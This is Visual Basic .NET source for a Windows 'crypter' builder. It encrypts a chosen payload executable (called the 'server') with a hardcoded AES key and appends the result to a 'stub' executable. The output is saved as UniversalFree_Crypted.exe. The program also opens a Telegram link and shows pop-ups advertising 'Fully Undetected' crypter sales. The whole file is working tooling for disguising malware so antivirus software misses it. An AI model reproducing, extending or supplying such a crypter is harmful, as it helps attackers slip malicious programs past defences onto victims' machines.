Imports System.IO
Imports System.Text
Imports System.Security.Cryptography

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim password As String = "PzRt12XnQb8765Yt"
        Dim server As Byte() = File.ReadAllBytes(TextBox1.Text)
        Dim rijAlg As New RijndaelManaged()
        rijAlg.Key = Encoding.ASCII.GetBytes(password)
        rijAlg.IV = Encoding.ASCII.GetBytes(password)
        Dim encryptor As ICryptoTransform = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV)
        Dim msEncrypt As New MemoryStream()
        Dim csEncrypt As New CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)

        csEncrypt.Write(server, 0, server.Length)
        csEncrypt.Close()
        Dim base64 As String = Convert.ToBase64String(msEncrypt.ToArray())
        If File.Exists(Directory.GetCurrentDirectory() & "\UniversalFree_Crypted.exe") Then
            File.Delete(Directory.GetCurrentDirectory() & "\UniversalFree_Crypted.exe")
        End If
        File.Copy(TextBox2.Text, Directory.GetCurrentDirectory() & "\UniversalFree_Crypted.exe")
        File.AppendAllText(Directory.GetCurrentDirectory() & "\UniversalFree_Crypted.exe", "[EOF]" & Convert.ToBase64String(msEncrypt.ToArray()))
        MsgBox("Crypted File Saved To:" & Directory.GetCurrentDirectory() & "\UniversalFree_Crypted.exe")
        Process.Start("https://t.me/universtool")
        MsgBox("For Quality Fully Undetected Crypter DM me: https://t.me/universdevz")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim server As New OpenFileDialog()
        server.Filter = "Exe | *.exe"
        If server.ShowDialog() = DialogResult.OK Then
            TextBox1.Text = server.FileName
        End If

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim stub As New OpenFileDialog()
        stub.Filter = "Exe | *.exe"
        If stub.ShowDialog() = DialogResult.OK Then
            TextBox2.Text = stub.FileName
        End If
    End Sub
End Class
